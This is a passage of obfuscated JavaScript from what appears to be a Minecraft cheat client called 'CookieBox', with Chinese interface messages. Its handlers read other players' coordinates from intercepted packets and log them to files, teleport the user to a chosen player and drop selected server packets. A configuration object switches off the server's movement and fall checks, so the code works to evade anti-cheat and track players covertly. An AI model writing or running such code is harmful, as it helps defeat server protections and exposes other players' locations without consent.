    clientMessage('[LV.' + getEntityAttribute(getLocalPlayerUniqueID(), 'minecraft:player.level').current + '][普通用户][' + Mscrt75443 + ']： ' + Mscrt23023);
    return true;
  }
  if (CHAT_MANAGER && CHAT_MANAGER_KEYWORD.some(Mscrt29254 => Mscrt23023.includes(Mscrt29254))) {
    messageCreater('玩家 ' + Mscrt75443 + ' 消息包含违禁词，已拦截');
    return true;
  }
}
function onPyRpcReceiveEvent(Mscrt37899, Mscrt65618) {
  if (GET_POS_STATES) {
    const Mscrt53790 = ab2str(Mscrt65618).toLowerCase();
    if (Mscrt53790.includes('posmap')) {
      const Mscrt66257 = new Uint8Array(Mscrt65618);
      const Mscrt44719 = Array.from(Mscrt66257, Mscrt60187 => Mscrt60187.toString(16).padStart(2, '0')).join('');
      let Mscrt88016 = calHexPos(Mscrt44719);
      let Mscrt11829 = hex2str(extractPlayerIdHex(Mscrt44719));
      let Mscrt41300 = getWorldPlayerList();
      let Mscrt82773 = Mscrt41300[Mscrt41300.findIndex(Mscrt84615 => Mscrt84615.id === Mscrt11829)]['name'];
      messageCreater('玩家昵称: ' + Mscrt82773 + ', 坐标: [' + Mscrt88016.x + ', ' + Mscrt88016.y + ', ' + Mscrt88016.z + ']');
      if (GET_POS_SAVE) GET_POS_TEXT.push('玩家昵称: ' + Mscrt82773 + ', 坐标: [' + Mscrt88016.x + ', ' + Mscrt88016.y + ', ' + Mscrt88016.z + ']');
      if (GET_POS_STATES) setTimeout(() => {
        if (GET_POS_STATES && GET_POS_SAVE) File.write(getResource('/坐标记录-' + Date.now() + '.txt'), GET_POS_TEXT.join('\n'));
        GET_POS_STATES = false;
      }, Mscrt41300.length * 100);
    }
  }
  if (SERVER_TP_states) {
    const Mscrt83057 = ab2str(Mscrt65618).toLowerCase();
    if (Mscrt83057.includes('posmap')) {
      const Mscrt72305 = new Uint8Array(Mscrt65618);
      const Mscrt72732 = Array.from(Mscrt72305, Mscrt3192 => Mscrt3192.toString(16).padStart(2, '0')).join('');
      let Mscrt10454 = calHexPos(Mscrt72732);
      if (!Mscrt10454.x || !Mscrt10454.y || !Mscrt10454.z || typeof Mscrt10454.x !== 'number' || typeof Mscrt10454.y !== 'number' || typeof Mscrt10454.z !== 'number') {
        messageCreater('未查询到玩家坐标，可能是不在同一个维度');
        SERVER_TP_states = false;
        return false;
      }
      let Mscrt50118 = hex2str(extractPlayerIdHex(Mscrt72732));
      let Mscrt76818 = getWorldPlayerList();
      let Mscrt62404 = Mscrt76818[Mscrt76818.findIndex(Mscrt63719 => Mscrt63719.id === Mscrt50118)]['name'];
      messageCreater('玩家昵称: ' + Mscrt62404 + ', 坐标: [' + Mscrt10454.x + ', ' + Mscrt10454.y + ', ' + Mscrt10454.z + ']');
      if (SERVER_TP_tp) {
        departCamera();
        setTimeout(() => setEntityPos(myId, Mscrt10454.x, Mscrt10454.y + SERVER_TP_offset, Mscrt10454.z), 100);
        setTimeout(() => resetCamera(), 200);
      }
      SERVER_TP_states = false;
    }
  }
}
function onReceiveServerPacketEvent(Mscrt33509, Mscrt62046) {
  if (ANTITEXT && Mscrt33509 === 9) return true;
  if (CRASHER_NEW && Mscrt33509 === 9) return true;
  if (AUTO_CONNECT) AUTO_CONNECT_TICK = 0;
  if (AUTO_CONNECT && AUTO_CONNECT_ADDR && Mscrt33509 === 5) executeCommand('/ww server ' + AUTO_CONNECT_ADDR.replace(':', ' '));
}
function onContainerItemMoveEvent(Mscrt88045, Mscrt33942) {
  if (TP_MINER && TP_MINER_CHEST) return true;
}
function onExecuteCommandEvent(Mscrt72172) {
  if (Mscrt72172 === '/exit') {
    messageCreater('CookieBox -> 已退出!');
    addCustomArrayList('CookieBox', '', '', false);
    exit();
    return true;
  }
}
const bypassConfig = {
  'no_move_check': true,
  'no_fall_check': true,
  'value': true
};
callModule(44, JSON.stringify(bypassConfig));
messageCreater('CookieBox - §a加载成功!');
messageCreater('当前版本: v2.8.5');
addCustomArrayList('CookieBox', 'CookieBox | 上有六龙回日之高标，下有冲波逆折之回川 | 欢迎使用 §aC§bo§co§dk§ei§de§cB§bo§ax', 'CookieBox | 上有六龙回日之高标，下有冲波逆折之回川 | 欢迎使用 §aC§bo§co§dk§ei§de§cB§bo§ax', true);